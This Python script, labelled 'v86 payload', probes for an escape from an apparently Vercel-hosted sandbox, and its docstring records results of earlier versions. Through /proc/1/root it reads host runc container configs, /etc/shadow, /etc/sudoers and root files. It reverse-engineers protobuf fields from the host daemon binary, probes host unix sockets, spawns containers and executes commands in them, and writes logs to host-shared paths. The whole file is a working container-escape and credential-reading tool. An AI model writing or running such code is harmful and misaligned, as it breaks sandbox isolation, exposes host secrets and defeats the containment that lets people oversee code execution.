# -*- coding: utf-8 -*-
"""v86 payload: drive 容器 runc 状态完整读取 + 全局 tag + 枚举值 + apm.sock + 权限确认
v85: WRITE-OK (宿主 /tmp 可写), apm.sock 可连, runc 目录有 config.json/container.pid/rootfs
目标: (a) drive 容器 OCI spec + 主进程 PID (b) StreamOutputRequest 字段号 (c) 枚举数字 (d) /etc/shadow"""
import socket, time, os, json, re

OUT = '/vercel/sandbox/v86c.out'


def log(s):
    line = '[%.3f] %s' % (time.time(), s)
    for p in (OUT, '/mnt/h/volumes/run/vercel/share/v86c2.out'):
        try:
            open(p, 'a', encoding='utf-8', errors='replace').write(line + '\n')
        except Exception:
            pass
    try:
        print(line, flush=True)
    except Exception:
        pass


def pvarint(n):
    out = bytearray()
    while n > 127:
        out.append((n & 127) | 128)
        n >>= 7
    out.append(n)
    return bytes(out)


def pstr(field_no, s):
    b = s.encode() if isinstance(s, str) else s
    return pvarint((field_no << 3) | 2) + pvarint(len(b)) + b


def rpc_raw(path, body=b'', ct='application/json', t=4):
    try:
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.settimeout(t)
        s.connect('/run/cell/cell.sock')
        req = ('POST %s HTTP/1.1\r\nHost: unix\r\nContent-Type: %s\r\n'
               'Content-Length: %d\r\nConnection: close\r\n\r\n' % (path, ct, len(body)))
        s.sendall(req.encode() + body)
        data = b''
        while True:
            try:
                chunk = s.recv(8192)
            except socket.timeout:
                break
            if not chunk:
                break
            data += chunk
        s.close()
        if not data:
            return 'NORESP', '', b''
        head, _, rest = data.partition(b'\r\n\r\n')
        lines = head.decode(errors='replace').split('\r\n')
        return lines[0], '\n'.join(lines[1:])[:100], rest
    except Exception as e:
        return 'EXC:%s' % type(e).__name__, '', b''


def rpc(path, body='{}', t=3):
    st, hd, bd = rpc_raw(path, body.encode(), 'application/json', t)
    return st, bd[:600].decode(errors='replace')


def exec_cmd(ctr, cid, argv, t=6):
    body = json.dumps({"containerId": cid, "process": {"argv": argv}})
    return rpc(ctr + '/Exec', body, t=t)


def main():
    log('V86 payload start pid=%d' % os.getpid())
    CTR = '/vercel.hive.cell.api.containers.v1.ContainersService'
    R = '/proc/1/root'

    # A. runc 状态 (drive 容器 OCI spec)
    try:
        base = R + '/run/cell/runc'
        for d in sorted(os.listdir(base)):
            p = base + '/' + d
            pidf = p + '/container.pid'
            try:
                pid = open(pidf).read().strip()
                log('RUNC %s pid=%s' % (d, pid))
            except Exception as e:
                log('RUNC %s pid ERR %s' % (d, e))
            try:
                cfg = open(p + '/config.json').read()
                log('RUNC %s config[%d]: %s' % (d, len(cfg), cfg[:1800]))
            except Exception as e:
                log('RUNC %s config ERR %s' % (d, e))
            try:
                for n in sorted(os.listdir(p + '/rootfs'))[:20]:
                    log('RUNC %s rootfs/%s' % (d, n))
            except Exception as e:
                log('RUNC %s rootfs ERR %s' % (d, e))
    except Exception as e:
        log('RUNC ERR %s' % e)

    # B. 全局 tag (字段号)
    data = open(R + '/opt/vercel/celld', 'rb').read()
    log('celld size=%d' % len(data))
    for fn in ('container_id', 'process_id', 'stream', 'output_stream', 'data', 'sandbox_id'):
        pat = re.compile(rb'protobuf:"[^"]*name=' + re.escape(fn.encode()) + rb'[^"]*"')
        ms = pat.findall(data)
        out = []
        for m in ms[:10]:
            s = m.decode(errors='replace')
            if s not in out:
                out.append(s[:140])
        log('TAG %-14s x%d -> %s' % (fn, len(ms), out))

    # C. 枚举值数字 (字符串前 300 字节)
    for ev in ('OUTPUT_STREAM_UNSPECIFIED', 'OUTPUT_STREAM_STDOUT', 'OUTPUT_STREAM_STDERR'):
        for m in re.finditer(re.escape(ev.encode()), data):
            i = m.start()
            seg = data[max(0, i - 120):i + 300]
            strs = re.findall(rb'[\x20-\x7e]{4,}', seg)
            log('ENUM %s -> %s' % (ev, ' | '.join(
                s.decode(errors='replace')[:50] for s in strs[:8])))
            break

    # D. /etc/shadow 权限 + 宿主敏感确认
    for p in ('/etc/shadow', '/etc/sudoers', '/root/.bashrc', '/opt/vercel/celld-init.sh'):
        try:
            d = open(R + p, 'rb').read(400)
            log('READ %s -> %r' % (p, d[:300]))
        except Exception as e:
            log('READ %s ERR %s' % (p, e))

    # E. apm.sock 探测
    for req, ct in ((b'GET / HTTP/1.1\r\nHost: x\r\n\r\n', 'x'),
                    (b'{}', 'application/json'),
                    (b'\x00\x00\x00\x00', 'application/grpc')):
        try:
            s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
            s.settimeout(3)
            s.connect(R + '/run/apm/apm.sock')
            if ct != 'x':
                s.sendall(('POST / HTTP/1.1\r\nHost: x\r\nContent-Type: %s\r\nContent-Length: %d\r\n\r\n' % (ct, len(req))).encode() + req)
            else:
                s.sendall(req)
            d = s.recv(300)
            log('APM %r -> %r' % (req[:20], d[:250]))
            s.close()
        except Exception as e:
            log('APM %r ERR %s' % (req[:20], type(e).__name__))

    # F. Exec unix 回连 + StreamOutput (字段3=枚举值)
    st, bd = rpc(CTR + '/Create', '{"drive_id":"sandbox"}')
    cid = bd.split('"containerId":"')[1].split('"')[0] if '"containerId"' in bd else None
    log('ID=%s' % (cid or 'NONE'))
    if cid:
        rpc(CTR + '/Start', '{"containerId":"%s"}' % cid, t=5)
        time.sleep(1)
        argv = ['/bin/sh', '-c',
                'rm -f /run/v86x.sock; python3 -c "import socket,os;'
                's=socket.socket(socket.AF_UNIX);s.bind(\'/run/v86x.sock\');s.listen(1);'
                'c,a=s.accept();c.send(b\'V86_UNIX_OK\');c.close();s.close();os.unlink(\'/run/v86x.sock\')" & '
                'sleep 20']
        st, bd = exec_cmd(CTR, cid, argv, t=6)
        PA = bd.split('"processId":"')[1].split('"')[0] if '"processId"' in bd else None
        log('execA PA=%s' % (PA or bd[:100]))
        time.sleep(2)
        try:
            s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
            s.settimeout(3)
            s.connect('/run/v86x.sock')
            log('UNIX-OK got=%r' % s.recv(100))
            s.close()
        except Exception as e:
            log('UNIX-ERR %s' % type(e).__name__)
        log('host-sock-exists=%s' % os.path.exists('/run/v86x.sock'))
        import struct
        for f3, label in ((1, 'enum1'), (2, 'enum2'), (3, 'enum3')):
            pl = pstr(1, cid) + pstr(2, PA) + pvarint((3 << 3) | 0) + pvarint(f3)
            st, hd, bd = rpc_raw(CTR + '/StreamOutput',
                                 b'\x00' + struct.pack('>I', len(pl)) + pl,
                                 'application/grpc', t=5)
            log('STREAM f3=%s -> %s %r' % (label, st, bd[:120]))
        rpc(CTR + '/Kill', '{"containerId":"%s"}' % cid)
        log('killed')

    log('V86C_DONE')


main()
